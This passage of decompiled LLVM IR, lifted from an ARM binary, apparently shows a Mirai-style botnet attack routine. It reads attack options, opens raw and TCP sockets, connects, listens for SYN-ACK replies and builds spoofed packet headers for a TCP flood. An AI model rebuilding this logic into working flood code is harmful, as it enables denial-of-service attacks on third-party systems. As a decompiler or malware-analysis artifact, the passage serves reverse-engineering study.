  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f4 = inttoptr i32 %v0_b3e4 to i32*
  %v6_b3f4 = call i32 @attack_get_opt_int(i32 %v0_b3ec, i32* %v5_b3f4, i32 7, i32 65535)
  %v0_b3f8 = load i32, i32* @r5, align 4
  store i32 %v0_b3f8, i32* %r1.global-to-local, align 4
  %v3_b3fc = mul i32 %v6_b3f4, 65536
  store i32 %v3_b3fc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v3_b40c = urem i32 %v6_b3f4, 65536
  store i32 %v3_b40c, i32* @sl, align 4
  %v4_b410 = inttoptr i32 %v0_b3f8 to i32*
  %v5_b410 = call i32 @attack_get_opt_int(i32 %v0_b408, i32* %v4_b410, i32 11, i32 0)
  %v1_b418 = urem i32 %v5_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @attack_get_opt_int(i32 %v0_b428, i32* %v5_b430, i32 12, i32 1)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @attack_get_opt_int(i32 %v0_b448, i32* %v5_b450, i32 13, i32 1)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @attack_get_opt_int(i32 %v0_b468, i32* %v5_b470, i32 14, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b47c to i32*
  %v6_b490 = call i32 @attack_get_opt_int(i32 %v0_b488, i32* %v5_b490, i32 15, i32 0)
  %v1_b498 = urem i32 %v6_b490, 256
  store i32 %v1_b498, i32* %ip.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4a8 = load i32, i32* @r4, align 4
  store i32 %v0_b4a8, i32* %r0.global-to-local, align 4
  %v5_b4b0 = inttoptr i32 %v0_b49c to i32*
  %v6_b4b0 = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4b0, i32 16, i32 0)
  %v1_b4b8 = urem i32 %v6_b4b0, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b4c4 = load i32, i32* @r5, align 4
  store i32 %v0_b4c4, i32* %r1.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  store i32 %v0_b4c8, i32* %r0.global-to-local, align 4
  %v5_b4d0 = inttoptr i32 %v0_b4c4 to i32*
  %v6_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v5_b4d0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4e0 = load i32, i32* @r5, align 4
  store i32 %v0_b4e0, i32* %r1.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r4, align 4
  store i32 %v0_b4e4, i32* %r0.global-to-local, align 4
  %v4_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  %v5_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v4_b4e8, i32 1, i32 1)
  %v1_b4f0 = urem i32 %v5_b4e8, 256
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b504 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b504, i32* %r0.global-to-local, align 4
  %v7_b508 = icmp eq i32 %v3_b504, -1
  store i1 %v7_b508, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b504, i32* @sb, align 4
  br i1 %v7_b508, label %dec_label_pc_b6f8, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b51c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b51c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b530 = call i32 @__GI_setsockopt(i32 %v3_b504, i32 0, i32 3, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v7_b534 = icmp eq i32 %v5_b530, -1
  store i1 %v7_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b534, label %dec_label_pc_b6f0, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b514
  %v0_b53c = load i32, i32* @r7, align 4
  %v3_b53c = mul i32 %v0_b53c, 65536
  store i32 %v3_b53c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b544 = load i32, i32* @r6, align 4
  %v2_b544 = icmp eq i32 %v0_b544, 0
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b54c = urem i32 %v0_b53c, 65536
  store i32 %v3_b54c, i32* @fp, align 4
  br i1 %v2_b544, label %dec_label_pc_b97c, label %dec_label_pc_b554.preheader

dec_label_pc_b554.preheader:                      ; preds = %dec_label_pc_b53c
  %v2_b5a0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b61c = ptrtoint i32* %stack_var_-80 to i32
  %v2_b628 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b62c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b68c = zext i8 %tmp to i32
  %v1_b690 = and i32 %v4_b68c, 18
  %v2_b694 = icmp eq i32 %v1_b690, 18
  %v4_b838 = sext i8 %v5_b394 to i32
  %sext = mul i32 %v5_b3b0, 16777216
  %v4_b848 = sdiv i32 %sext, 16777216
  %v3_b678 = sext i16 %tmp61 to i32
  %v1_b69c = and i32 %v4_b68c, 5
  %v2_b69c = icmp eq i32 %v1_b69c, 0
  %v4_b5dc = add i32 %v2_b5a0, 82
  %v5_b5dc = inttoptr i32 %v4_b5dc to i16*
  %v1_b7cc = add i32 %v6_b4d0, 40
  %v1_b8e0 = urem i32 %v5_b410, 2
  %tmp97 = sub nsw i32 0, %v1_b8e0
  %v4_b8e8 = and i32 %tmp97, 32
  %v1_b8f8 = urem i32 %v6_b430, 2
  %tmp98 = sub nsw i32 0, %v1_b8f8
  %v4_b900 = and i32 %tmp98, 16
  %v1_b910 = urem i32 %v6_b450, 2
  %tmp99 = sub nsw i32 0, %v1_b910
  %v4_b918 = and i32 %tmp99, 8
  %v1_b928 = urem i32 %v6_b470, 2
  %tmp100 = sub nsw i32 0, %v1_b928
  %v4_b930 = and i32 %tmp100, 4
  %v1_b940 = urem i32 %v6_b490, 2
  %tmp101 = sub nsw i32 0, %v1_b940
  %v3_b948 = and i32 %tmp101, 2
  %v1_b958 = urem i32 %v6_b4b0, 2
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b554.preheader, %dec_label_pc_b6c8
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b6c8 ], [ %tmp34, %dec_label_pc_b554.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b6c8 ], [ %tmp37, %dec_label_pc_b554.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b560 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b560, i32* %r0.global-to-local, align 4
  %v7_b564 = icmp eq i32 %v3_b560, -1
  store i1 %v7_b564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b560, i32* @r5, align 4
  br i1 %v7_b564, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b6a4
  %v0_b578 = phi i32 [ %v3_b6b8, %dec_label_pc_b6a4 ], [ %v3_b560, %dec_label_pc_b554 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b6a4 ], [ %stack_var_-62.0, %dec_label_pc_b554 ]
  %stack_var_-60.1 = phi i32 [ %v0_b778, %dec_label_pc_b6a4 ], [ %stack_var_-60.0, %dec_label_pc_b554 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b578 = call i32 @__libc_fcntl(i32 %v0_b578, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b580 = or i32 %v2_b578, 2048
  store i32 %v1_b580, i32* @r2, align 4
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v2_b588 = call i32 @__libc_fcntl(i32 %v0_b584, i32 4)
  %v3_b58c = load i32, i32* %stack_var_-44, align 4
  %v5_b594 = mul i32 %v3_b58c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b5a8 = add i32 %v5_b594, %arg2
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 20
  %v2_b5ac = inttoptr i32 %v1_b5ac to i8*
  %v3_b5ac = load i8, i8* %v2_b5ac, align 1
  %v4_b5ac = zext i8 %v3_b5ac to i32
  store i32 %v4_b5ac, i32* %r2.global-to-local, align 4
  %v2_b5b0 = icmp ugt i8 %v3_b5ac, 30
  %v7_b5b0 = icmp eq i8 %v3_b5ac, 31
  store i1 %v7_b5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_b5b4 = xor i1 %v7_b5b0, true
  %v3_b5b4 = and i1 %v2_b5b0, %v2_b5b4
  br i1 %v3_b5b4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b570
  %v5_b5b4 = add i32 %v2_b5a8, 16
  %v6_b5b4 = inttoptr i32 %v5_b5b4 to i32*
  %v7_b5b4 = load i32, i32* %v6_b5b4, align 4
  store i32 %v7_b5b4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b570, %bb
  %v4_b5b8 = phi i32 [ %v2_b5a8, %dec_label_pc_b570 ], [ %v7_b5b4, %bb ]
  %v4_b5b8.stack_var_-60.1 = select i1 %v3_b5b4, i32 %v4_b5b8, i32 %stack_var_-60.1
  %v2_b5bc = xor i1 %v2_b5b0, true
  %v3_b5bc = or i1 %v7_b5b0, %v2_b5bc
  br i1 %v3_b5bc, label %dec_label_pc_b704, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %bb71, %dec_label_pc_b704
  %v0_b778 = phi i32 [ %v5_b754, %dec_label_pc_b704 ], [ %v4_b5b8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sl, align 4
  %v9_b5c8 = icmp eq i32 %v0_b5c8, 65535
  store i1 %v9_b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5c8, label %dec_label_pc_b760, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b5c0
  %v4_b5cc = udiv i32 %v0_b5c8, 256
  %v2_b5d0 = urem i32 %v0_b5c8, 256
  store i32 %v2_b5d0, i32* %r2.global-to-local, align 4
  %v5_b5d4 = mul nuw nsw i32 %v2_b5d0, 256
  %v6_b5d4 = or i32 %v5_b5d4, %v4_b5cc
  store i32 %v6_b5d4, i32* %r3.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  %v2_b5dc = trunc i32 %v6_b5d4 to i16
  store i16 %v2_b5dc, i16* %v5_b5dc, align 2
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %.thread9, %dec_label_pc_b760
  %stack_var_-62.2 = phi i16 [ %v1_b760, %dec_label_pc_b760 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  %v3_b5f0 = call i32 @__libc_connect(i32 %v0_b5ec, i32 %v2_b5e4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b5f8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5f8, i32* @r4, align 4
  %v9_b658 = icmp eq i32 %tmp35, %v0_b778
  %v4_b680 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b658 to i32
  %v9_b66c = icmp eq i1 %v9_b658, false
  %v9_b684 = icmp eq i32 %v3_b678, %v4_b680
  br label %dec_label_pc_b614

dec_label_pc_b604:                                ; preds = %.thread, %dec_label_pc_b674, %dec_label_pc_b69c, %bb75
  %v2_b604 = call i32 @__GI_time(i32* null)
  %v0_b608 = load i32, i32* @r4, align 4
  %v2_b608 = sub i32 %v2_b604, %v0_b608
  store i32 %v2_b608, i32* %r0.global-to-local, align 4
  %v7_b60c = icmp eq i32 %v2_b608, 10
  store i1 %v7_b60c, i1* %cpsr_z.global-to-local, align 1
  %v8_b610 = icmp sgt i32 %v2_b608, 10
  br i1 %v8_b610, label %dec_label_pc_b6a4, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b604, %dec_label_pc_b5e4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b628, i32* %r1.global-to-local, align 4
  store i32 %v2_b62c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b634 = load i32, i32* @sb, align 4
  store i32 %v0_b634, i32* %r0.global-to-local, align 4
  %v6_b63c = call i32 @__libc_recvfrom(i32 %v0_b634, i32 %v2_b628, i32 256, i32 16384, i32 %v2_b61c, i32 %v2_b62c)
  store i32 %v6_b63c, i32* %r2.global-to-local, align 4
  %v7_b644 = icmp eq i32 %v6_b63c, -1
  store i1 %v7_b644, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b644, label %dec_label_pc_b6f8, label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b614
  store i32 %v0_b778, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b664 = icmp eq i32 %v6_b63c, 40
  store i1 %v7_b664, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b63c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b650
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b604

bb75:                                             ; preds = %dec_label_pc_b650
  store i1 %v9_b66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b66c, label %dec_label_pc_b604, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %bb75
  store i32 %v3_b678, i32* @lr, align 4
  store i32 %v2_b5a0, i32* @r3, align 4
  store i32 %v4_b680, i32* %r2.global-to-local, align 4
  store i1 %v9_b684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b684, label %dec_label_pc_b68c, label %dec_label_pc_b604

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674
  store i32 %v4_b68c, i32* %r2.global-to-local, align 4
  store i32 %v1_b690, i32* @r3, align 4
  store i1 %v2_b694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b694, label %dec_label_pc_b770, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b68c
  store i1 %v2_b69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b69c, label %dec_label_pc_b604, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b604
  %v0_b6a4 = load i32, i32* @r5, align 4
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__GI___libc_close(i32 %v0_b6a4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b6b8, i32* %r0.global-to-local, align 4
  %v3_b6bc = icmp eq i32 %v3_b6b8, -1
  %v8_b6bc = icmp eq i32 %v3_b6b8, -1
  store i1 %v8_b6bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6b8, i32* @r5, align 4
  br i1 %v3_b6bc, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b554, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b554 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b6a4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b554 ], [ %v0_b778, %bb82 ], [ %v0_b778, %dec_label_pc_b6a4 ]
  %v3_b6c8 = load i32, i32* %stack_var_-44, align 4
  %v1_b6cc = add i32 %v3_b6c8, 1
  store i32 %v1_b6cc, i32* @r3, align 4
  %v1_b6d0 = load i32, i32* @r6, align 4
  %v9_b6d0 = icmp eq i32 %v1_b6cc, %v1_b6d0
  store i1 %v9_b6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b6cc, i32* %stack_var_-44, align 4
  %v5_b6d8 = icmp slt i32 %v1_b6cc, %v1_b6d0
  br i1 %v5_b6d8, label %dec_label_pc_b554, label %dec_label_pc_b6dc

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6c8
  store i32 %v6_b4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b98c

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b514
  %v0_b6f0 = load i32, i32* @sb, align 4
  store i32 %v0_b6f0, i32* %r0.global-to-local, align 4
  %v1_b6f4 = call i32 @__GI___libc_close(i32 %v0_b6f0)
  store i32 %v1_b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b614, %entry, %dec_label_pc_b6f0
  %v1_b700 = phi i32 [ %v3_b504, %entry ], [ %v1_b6f4, %dec_label_pc_b6f0 ], [ 0, %dec_label_pc_b614 ]
  store i32 %v27_b330, i32* %lr.global-to-local, align 4
  ret i32 %v1_b700

dec_label_pc_b704:                                ; preds = %bb71
  %v1_b704 = add i32 %v4_b5b8, 16
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* @r4, align 4
  %v0_b708 = call i32 @rand_next()
  store i32 %v0_b708, i32* %r0.global-to-local, align 4
  %v3_b70c = load i32, i32* %stack_var_-44, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  %v0_b71c = load i32, i32* @r4, align 4
  %v1_b71c = and i32 %v0_b71c, 16711680
  store i32 %v1_b71c, i32* %ip.global-to-local, align 4
  %v3_b720 = udiv i32 %v0_b71c, 16777216
  %v2_b724 = add i32 %v5_b714, %arg2
  store i32 %v2_b724, i32* %r1.global-to-local, align 4
  %v4_b728 = udiv i32 %v1_b71c, 256
  %v5_b728 = or i32 %v4_b728, %v3_b720
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b72c = and i32 %v0_b71c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_b72c, i32* %r3.global-to-local, align 4
  %v1_b730 = add i32 %v2_b724, 20
  %v2_b730 = inttoptr i32 %v1_b730 to i8*
  %v3_b730 = load i8, i8* %v2_b730, align 1
  %v4_b730 = zext i8 %v3_b730 to i32
  store i32 %v4_b730, i32* %ip.global-to-local, align 4
  %v4_b734 = mul i32 %v1_b72c, 256
  %v4_b738 = mul i32 %v0_b71c, 16777216
  %v5_b734 = or i32 %v4_b734, %v4_b738
  %v5_b738 = or i32 %v5_b734, %v5_b728
  %v7_b73c = lshr i32 %v0_b708, %v4_b730
  %v8_b73c = add i32 %v7_b73c, %v5_b738
  store i32 %v8_b73c, i32* %r2.global-to-local, align 4
  %v1_b740 = and i32 %v8_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  %v1_b74c = and i32 %v8_b73c, 65280
  store i32 %v1_b74c, i32* %r1.global-to-local, align 4
  %v5_b754 = call i32 @llvm.bswap.i32(i32 %v8_b73c)
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b5c0

dec_label_pc_b760:                                ; preds = %dec_label_pc_b5c0
  %v0_b760 = call i32 @rand_next()
  %v1_b760 = trunc i32 %v0_b760 to i16
  store i32 %v0_b760, i32* %r0.global-to-local, align 4
  store i32 %v2_b5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b68c
  %v3_b770 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b770, i32* @r4, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v5_b778 = mul i32 %v3_b770, 16
  %v6_b778 = add i32 %v5_b778, %v2_b34c
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  store i32 %v0_b778, i32* %v7_b778, align 4
  %v0_b77c = load i32, i32* @r8, align 4
  %v1_b77c = add i32 %v0_b77c, 4
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r1.global-to-local, align 4
  %v3_b784 = udiv i32 %v3_b77c, 16777216
  %v1_b788 = and i32 %v3_b77c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  %v1_b780 = udiv i32 %v3_b77c, 256
  %v4_b78c = and i32 %v1_b780, 65280
  store i32 %v2_b34c, i32* %r0.global-to-local, align 4
  %v4_b794 = mul i32 %v1_b788, 256
  %v0_b798 = load i32, i32* @r4, align 4
  %v3_b798 = mul i32 %v0_b798, 16
  %v2_b79c = add i32 %v3_b798, %v2_b34c
  store i32 %v2_b79c, i32* %ip.global-to-local, align 4
  %v4_b7a0 = mul i32 %v3_b77c, 16777216
  %v5_b78c = or i32 %v4_b7a0, %v3_b784
  %v5_b794 = or i32 %v5_b78c, %v4_b78c
  %v5_b7a0 = or i32 %v5_b794, %v4_b794
  store i32 %v5_b7a0, i32* %r3.global-to-local, align 4
  %v2_b7a4 = add i32 %v2_b79c, 4
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v5_b7a0, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* @r8, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  %v2_b7a8 = inttoptr i32 %v1_b7a8 to i32*
  %v3_b7a8 = load i32, i32* %v2_b7a8, align 4
  store i32 %v3_b7a8, i32* %r1.global-to-local, align 4
  %v1_b7ac = and i32 %v3_b7a8, 16711680
  store i32 %v1_b7ac, i32* %r0.global-to-local, align 4
  %v3_b7b0 = udiv i32 %v3_b7a8, 16777216
  %v1_b7b4 = and i32 %v3_b7a8, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v4_b7b8 = udiv i32 %v1_b7ac, 256
  %v4_b7bc = mul i32 %v1_b7b4, 256
  store i32 %v6_b4d0, i32* %r2.global-to-local, align 4
  %v4_b7c4 = mul i32 %v3_b7a8, 16777216
  %v5_b7b8 = or i32 %v4_b7c4, %v3_b7b0
  %v5_b7bc = or i32 %v5_b7b8, %v4_b7b8
  %v5_b7c4 = or i32 %v5_b7bc, %v4_b7bc
  store i32 %v5_b7c4, i32* %r3.global-to-local, align 4
  %v1_b7c8 = add i32 %v0_b7a8, 2
  %v2_b7c8 = inttoptr i32 %v1_b7c8 to i16*
  %v3_b7c8 = load i16, i16* %v2_b7c8, align 2
  %v4_b7c8 = zext i16 %v3_b7c8 to i32
  store i32 %v4_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b7cc, i32* @r7, align 4
  %v0_b7d0 = load i32, i32* @lr, align 4
  %v1_b7d0 = trunc i32 %v0_b7d0 to i16
  %v2_b7d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 14
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i16*
  store i16 %v1_b7d0, i16* %v4_b7d0, align 2
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 12
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = add i32 %v1_b7d8, 8
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v0_b7d8, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* @r7, align 4
  store i32 %v0_b7dc, i32* @r0, align 4
  %v0_b7e0 = call i32 @malloc()
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* @r4, align 4
  %v5_b7ec = mul i32 %v2_b7ec, 4
  %v6_b7ec = add i32 %v5_b7ec, %v2_b35c
  %v7_b7ec = inttoptr i32 %v6_b7ec to i32*
  store i32 %v0_b7e0, i32* %v7_b7ec, align 4
  %v3_b7f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7f0, i32* %r2.global-to-local, align 4
  %v0_b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7f4 = mul i32 %v3_b7f0, 4
  %v5_b7f4 = add i32 %v0_b7f4, %v4_b7f4
  %v6_b7f4 = inttoptr i32 %v5_b7f4 to i32*
  %v7_b7f4 = load i32, i32* %v6_b7f4, align 4
  store i32 %v7_b7f4, i32* @r4, align 4
  %v1_b7f8 = inttoptr i32 %v7_b7f4 to i8*
  %v2_b7f8 = load i8, i8* %v1_b7f8, align 1
  %tmp103 = urem i8 %v2_b7f8, 16
  %v1_b7fc = zext i8 %tmp103 to i32
  %v1_b800 = or i32 %v1_b7fc, 64
  store i32 %v1_b800, i32* %r3.global-to-local, align 4
  %v1_b804 = trunc i32 %v1_b800 to i8
  store i8 %v1_b804, i8* %v1_b7f8, align 1
  %v0_b808 = load i32, i32* @r4, align 4
  %v1_b808 = inttoptr i32 %v0_b808 to i8*
  %v2_b808 = load i8, i8* %v1_b808, align 1
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b80c, 256
  %v1_b814 = and i8 %v2_b808, -16
  %v1_b818 = or i8 %v1_b814, 5
  %v1_b81c = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp78 = udiv i32 %v0_b80c, 256
  %v4_b820 = urem i32 %tmp78, 256
  %v5_b820 = or i32 %v4_b820, %v1_b81c
